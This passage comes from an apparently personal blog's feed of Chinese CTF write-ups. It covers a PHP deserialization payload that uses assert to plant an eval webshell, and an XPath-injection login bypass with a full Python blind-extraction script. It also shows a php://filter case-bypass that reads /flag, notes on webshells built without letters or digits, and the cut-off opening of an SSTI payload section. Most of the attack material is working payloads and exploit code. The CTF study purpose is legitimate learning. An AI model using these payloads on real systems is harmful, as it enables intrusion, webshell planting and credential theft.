class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$h = <span class="keyword">new</span> HelloPhp;</span><br><span class="line">$h-&gt;a = <span class="string">'file_put_contents("yakko.php", "&lt;?php eval(\$_REQUEST[\'cmd\']); ?&gt;")'</span>;</span><br><span class="line">$h-&gt;b = <span class="string">"assert"</span>;</span><br><span class="line"><span class="comment">//eval($h-&gt;a);</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($h));</span><br><span class="line">@$ppp = unserialize(serialize($h));</span><br></pre></td></tr></table></figure></div><p>Payload:<br><code>time.php?O%3A8%3A%22HelloPhp%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A67%3A%22file_put_contents%28%22yakko.php%22%2C+%22%3C%3Fphp+eval%28%5C%24_REQUEST%5B%27cmd%27%5D%29%3B+%3F%3E%22%29%22%3Bs%3A1%3A%22b%22%3Bs%3A6%3A%22assert%22%3B%7D</code></p><p>然后蚁剑 绕过 <code>disable_fuction</code>, Payload <code>echo $FLAG</code></p><hr><h1 id="NPUCTF2020-ezlogin"><a href="#NPUCTF2020-ezlogin" class="headerlink" title="[NPUCTF2020] ezlogin"></a>[NPUCTF2020] ezlogin</h1><p><a href="https://www.cnblogs.com/W4nder/p/12747742.html" target="_blank" rel="noopener">https://www.cnblogs.com/W4nder/p/12747742.html</a><br><a href="https://shimo.im/docs/6hyIjGkLoRc43JRs/read" target="_blank" rel="noopener">https://shimo.im/docs/6hyIjGkLoRc43JRs/read</a></p><p>登陆页面如下<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ha1cyon_login_1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/ha1cyon_login_1.png" class="lazyload"></a></p><p>查看源码，在 <code>static/main.js</code> 发现关键点</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doLogin</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> username = $(<span class="string">"#username"</span>).val();</span><br><span class="line">  <span class="keyword">var</span> password = $(<span class="string">"#password"</span>).val();</span><br><span class="line">  <span class="keyword">var</span> token = $(<span class="string">"#token"</span>).val();</span><br><span class="line">  <span class="keyword">if</span>(username == <span class="string">""</span> || password == <span class="string">""</span>)&#123;</span><br><span class="line">    $(<span class="string">".msg"</span>).text(<span class="string">"用户名和密码不能为空!"</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">var</span> data = <span class="string">"&lt;username&gt;"</span>+username+<span class="string">"&lt;/username&gt;"</span>+<span class="string">"&lt;password&gt;"</span>+password+<span class="string">"&lt;/password&gt;"</span>+<span class="string">"&lt;token&gt;"</span>+token+<span class="string">"&lt;/token&gt;"</span>; </span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        type: <span class="string">"POST"</span>,</span><br><span class="line">        url: <span class="string">"login.php"</span>,</span><br><span class="line">        contentType: <span class="string">"application/xml"</span>,</span><br><span class="line">        data: data,</span><br><span class="line">        anysc: <span class="keyword">false</span>,</span><br><span class="line">        success: <span class="function"><span class="keyword">function</span> <span class="params">(result, status, xhr)</span> </span>&#123;</span><br><span class="line">          <span class="keyword">if</span>(result == <span class="string">'成功'</span>)&#123;</span><br><span class="line">            window.location.href = <span class="string">'admin.php'</span>;  </span><br><span class="line">          &#125;</span><br><span class="line">          $(<span class="string">".msg"</span>).text(result);</span><br><span class="line">          </span><br><span class="line">        &#125;,</span><br><span class="line">        error: <span class="function"><span class="keyword">function</span> <span class="params">(XMLHttpRequest,textStatus,errorThrown)</span> </span>&#123;</span><br><span class="line">            $(<span class="string">".msg"</span>).text(errorThrown + <span class="string">':'</span> + textStatus);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>看到熟悉的xml，一开始以为是XXE，（然后站被日了 = =<br>后来复现的时候，知道是 <a href="https://www.cnblogs.com/backlion/p/8554749.html" target="_blank" rel="noopener">Xpath注入</a></p><h2 id="注入与绕过"><a href="#注入与绕过" class="headerlink" title="注入与绕过"></a>注入与绕过</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$query = "/root/accounts/user[username/text()='".$name."' and password/text()='".$pwd."']";</span><br><span class="line"></span><br><span class="line">1.万能密码，这点和SQL很像；在知道用户名的情况：</span><br><span class="line">?name=admin' or '1'='1&amp;pwd=fake</span><br><span class="line"></span><br><span class="line">在不知道用户名的情况，使用两个or绕过：</span><br><span class="line">?name=fake' or '1'or'1&amp;pwd=fake</span><br><span class="line"></span><br><span class="line">2.使用|操作符，</span><br><span class="line">?name=1']|/<span class="comment">/*|ss['&amp;pwd=fake</span></span><br></pre></td></tr></table></figure></div><p>其执行的语句为：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/root/accounts/user[username/text()='1' ]|/<span class="comment">/*|ss['' and password/text()='1']</span></span><br></pre></td></tr></table></figure></div><p>即先闭合前面的语句，之后列出文档所有元素</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.盲注，需要一级一级猜解节点；猜解第一级节点：</span><br><span class="line">?name=1' or substring(name(<span class="comment">/*[position()=1]),1,1)='r' or '1'='1&amp;pwd=fake</span></span><br></pre></td></tr></table></figure></div><p>然后是注入</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">猜解第二级节点数量：</span><br><span class="line">?name=1' or count(/root<span class="comment">/*)=2 or '1'='1&amp;fake</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">猜解第二级节点：</span></span><br><span class="line"><span class="comment">?name=1' or substring(name(/root/*[position()=1]),1,1)='u' or '1'='1&amp;pwd=fake</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">猜解id为1的user节点下的username值：</span></span><br><span class="line"><span class="comment">?name=1' or substring(/root/users/user[id=1]/username,1,1)='a' or '1'='1&amp;pwd=fake</span></span><br></pre></td></tr></table></figure></div><h2 id="大佬的exp"><a href="#大佬的exp" class="headerlink" title="大佬的exp"></a>大佬的exp</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://buuoj-test.cn/'</span></span><br><span class="line">sess=requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">token</span><span class="params">()</span>:</span></span><br><span class="line">    req=sess.get(url)</span><br><span class="line">    tok=re.findall(<span class="string">'&lt;input type="hidden" id="token" value="(.*)" /&gt;'</span>,req.text)</span><br><span class="line">    <span class="keyword">return</span> tok[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username,password)</span>:</span></span><br><span class="line">    data=<span class="string">'''</span></span><br><span class="line"><span class="string">&lt;username&gt;&#123;&#125;&lt;/username&gt;&lt;password&gt;&#123;&#125;&lt;/password&gt;&lt;token&gt;&#123;&#125;&lt;/token&gt;</span></span><br><span class="line"><span class="string">'''</span>.format(username,password,token())</span><br><span class="line"></span><br><span class="line">    req=sess.post(url+<span class="string">'login.php'</span>,data=data,headers = &#123;<span class="string">'Content-Type'</span>: <span class="string">'application/xml'</span>&#125;)</span><br><span class="line">    print(req.text,req.status_code)</span><br><span class="line">    <span class="keyword">return</span> req</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># root</span></span><br><span class="line">payload=<span class="string">"' or  substring(name(/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'root'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'accounts'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/accounts/*[position()=1]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line">ro=<span class="string">'user'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"' or substring(name(/root/accounts/user/*[position()=2]),&#123;&#125;,1)='&#123;&#125;'  or '1' = '1"</span></span><br><span class="line"><span class="comment"># id username password</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1' or substring(/root/accounts/user[id=2]/username,&#123;&#125;,1)='&#123;&#125;' or '1'='1"</span></span><br><span class="line"><span class="comment"># guest adm1n</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"1' or substring(/root/accounts/user[id=2]/password,&#123;&#125;,1)='&#123;&#125;' or '1'='1"</span></span><br><span class="line"><span class="comment">#cf7414b5bdb2e65ee43083f4ddbc4d9f gtfly123</span></span><br><span class="line">ro=<span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> string.digits+string.ascii_letters+<span class="string">'*'</span>:</span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">'*'</span>:</span><br><span class="line">            print(<span class="string">'***************false'</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        tmp=payload.format(i,j)</span><br><span class="line"></span><br><span class="line">        req=login(tmp,<span class="string">'ad'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'非法操作'</span> <span class="keyword">in</span> req.text:</span><br><span class="line">            ro+=j</span><br><span class="line">            print(ro)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></div><hr><p>得到 <code>adm1n cf7414b5bdb2e65ee43083f4ddbc4d9f</code><br>md5解密 gtfly123</p><p>登陆成功后，看到URL为 <code>admin.php?file=welcome</code><br>查看源码，看到有 <code>base64</code> 加密后的 <code>flag is in /flag</code><br>说明还考查文件包含，用伪协议打，测了一下，大概有几个过滤 <code>php read base64</code><br>也还是简单，大小写绕过</p><p><code>/admin.php?file=Php://filter/Read=convert.Base64-encode/resource=/flag</code></p><hr><p>后面的一些题目先摸了，有空再来看了</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="writeup" scheme="https://manayakko.github.io/yakko117/tags/writeup/"/>
    
      <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>无数字字母绕过 Bypass</title>
    <link href="https://manayakko.github.io/yakko117/2020/04/16/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E7%BB%95%E8%BF%87webshell/"/>
    <id>https://manayakko.github.io/yakko117/2020/04/16/%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8D%E7%BB%95%E8%BF%87webshell/</id>
    <published>2020-04-16T03:08:09.874Z</published>
    <updated>2020-04-16T03:08:01.477Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>很久以前做过安恒的题，最近遇到个差不多，来记录一下学习笔记<br>利用思路提出来自P神<a href="https://www.leavesongs.com/penetration/webshell-without-alphanum.html" target="_blank" rel="noopener">一些不包含数字和字母的 webshell</a></p><h1 id="漏洞核心"><a href="#漏洞核心" class="headerlink" title="漏洞核心"></a>漏洞核心</h1><ul><li>异或绕过 Bypass</li><li>取反绕过</li><li>不用数字构造出数字( 弱类型 <code>true 值为 1</code> -&gt; <code>true + true == 2</code> )</li></ul><h1 id="安恒的题型和变种"><a href="#安恒的题型和变种" class="headerlink" title="安恒的题型和变种"></a>安恒的题型和变种</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$hint =  "php function getFlag() to get flag";</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>具体参看 <a href="https://www.freebuf.com/articles/web/186298.html" target="_blank" rel="noopener">P神的文章</a><br>以及 <a href="https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/" target="_blank" rel="noopener">微笑师傅的衍生操作</a></p><h1 id="ISITDTU-CTF-2019-EasyPHP"><a href="#ISITDTU-CTF-2019-EasyPHP" class="headerlink" title="ISITDTU CTF 2019 EasyPHP"></a>ISITDTU CTF 2019 EasyPHP</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$_ = @$_GET[<span class="string">'_'</span>];</span><br><span class="line"><span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $_) )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'rosé will not do it'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( strlen(count_chars(strtolower($_), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> )</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'you are so close, omg'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>($_);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>有点类似以前写的国赛的 <a href="https://www.suk1.top/2019/05/16/love_math/" target="_blank" rel="noopener">love_math</a></p><p>正则匹配了一些字母和数字还有一些特殊符号。 具体调试正则 这里有个<a href="https://regex101.com/" target="_blank" rel="noopener">工具网站</a></p><p>正则的意思是匹配 <code>\x00</code> 到 <code>空格(\x20)</code> 的字符， <code>0到9</code> 的数字、<code>&quot;$&amp;.,|[{_defgops</code> 以及 <code>DEL（\x7f）</code> 字符。如果你提交的字符串出现上述字符，die。</p><p>第二个<code>strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd</code><br>表示我们提交的字符串一共不能出现多于 <strong>13种不同的字符</strong>。</p><p>允许出现的字符如下：<code>!#%()*+-/:;&lt;=&gt;?</code><br><code>@ABCHIJKLMNQRTUVWXYZ\]^abchijklmnqrtuvwxyz}~</code></p><h2 id="test-php"><a href="#test-php" class="headerlink" title="test.php"></a>test.php</h2><p>看一下内置函数还有哪些能用</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array=get_defined_functions();</span><br><span class="line"><span class="keyword">foreach</span>($array[<span class="string">'internal'</span>] <span class="keyword">as</span> $arr)&#123;</span><br><span class="line">    <span class="keyword">if</span> ( preg_match(<span class="string">'/[\x00- 0-9\'"\`$&amp;.,|[&#123;_defgops\x7F]+/i'</span>, $arr) ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">if</span> ( strlen(count_chars(strtolower($arr), <span class="number">0x3</span>)) &gt; <span class="number">0xd</span> ) <span class="keyword">continue</span>;</span><br><span class="line">    <span class="keyword">print</span>($arr.<span class="string">'&lt;br/&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">bcmul, rtrim, trim, ltrim</span><br><span class="line">chr, link, unlink, tan</span><br><span class="line">atan, atanh, tanh, intval</span><br><span class="line">mail, min, max</span><br></pre></td></tr></table></figure></div><p>虽然引号都被过滤了，但是PHP默认会把没有加引号的字符串当成常量处理，找不到对应常量就会将其解释成字符串，因此没有引号不是限制。</p><p>而且PHP调用函数，可以使用字符串调用。这个在当初 <a href="https://www.suk1.top/2020/02/05/GXY%E5%A5%97%E5%A8%83/" target="_blank" rel="noopener">GXY禁止套娃</a> 有提到过</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/limit_webshell_1.png" data-fancybox="group" data-caption="limit_webshell_1" class="fancybox"><img alt="limit_webshell_1" title="limit_webshell_1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/limit_webshell_1.png" class="lazyload"></a></p><p>注意到 <code>^</code> 符号没有被过滤，那么我们就可以通过对字符串进行运算来规避if了。</p><p>后面就是常规的异或解题</p><h2 id="相关的参考"><a href="#相关的参考" class="headerlink" title="相关的参考"></a>相关的参考</h2><p><a href="https://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/" target="_blank" rel="noopener">Tiaonmmn.ZMZ官方wp</a><br><a href="https://www.cnblogs.com/BOHB-yunying/p/11520031.html" target="_blank" rel="noopener">PHP代码审计，无字母数字webshell</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
      <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>SSTi 模板注入笔记</title>
    <link href="https://manayakko.github.io/yakko117/2020/04/09/SSTi_learning/"/>
    <id>https://manayakko.github.io/yakko117/2020/04/09/SSTi_learning/</id>
    <published>2020-04-09T03:31:56.485Z</published>
    <updated>2020-04-13T01:41:01.208Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>小声bb，想玩FF7</p><h1 id="什么是SSTi"><a href="#什么是SSTi" class="headerlink" title="什么是SSTi"></a>什么是SSTi</h1><p><code>SSTi</code> 就是服务器端模板注入<code>(Server-Side Template Injection)</code>，也给出了一个注入的概念。<br>常见的注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。</p><p><code>SSTi</code> 也是获取了一个输入，然后再后端的渲染处理上进行了语句的拼接，然后执行。当然还是和sql注入有所不同的，<code>SSTi</code> 利用的是现在的网站模板引擎(下面会提到)，主要针对<code>python</code>、<code>php</code>、<code>java</code> 的一些网站处理框架，比如<strong>Python</strong> 的 <strong>jinja2 mako tornado django</strong>，<strong>Php</strong> 的 <strong>smarty twig</strong>，<strong>Java</strong> 的 <strong>jade velocity</strong>。当这些框架对运用渲染函数生成html的时候会出现 <code>SSTi</code> 的问题。</p><p>现在网上提起的比较多的是Python的网站。</p><h2 id="模板引擎"><a href="#模板引擎" class="headerlink" title="模板引擎"></a>模板引擎</h2><p><strong>模板引擎</strong> (这里特指用于Web开发的模板引擎)</p><ul><li>是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。</li><li>可以让（网站）程序实现界面与数据分离,业务代码与逻辑代码的分离，这就大大提升了开发效率，良好的设计也使得代码重用变得更加容易。</li></ul><p>也就是说，利用 <strong>模板引擎</strong> 来生成前端的 <code>html代码</code>，模板引擎会提供一套生成html代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成 <code>模板+用户数据</code>的 <code>前端html页面</code>，然后反馈给浏览器，呈现在用户面前。</p><p>模板引擎也会提供沙箱机制来进行漏洞防范，但是可以用沙箱逃逸技术来进行绕过。</p><h1 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exec webshell1</span></span><br><span 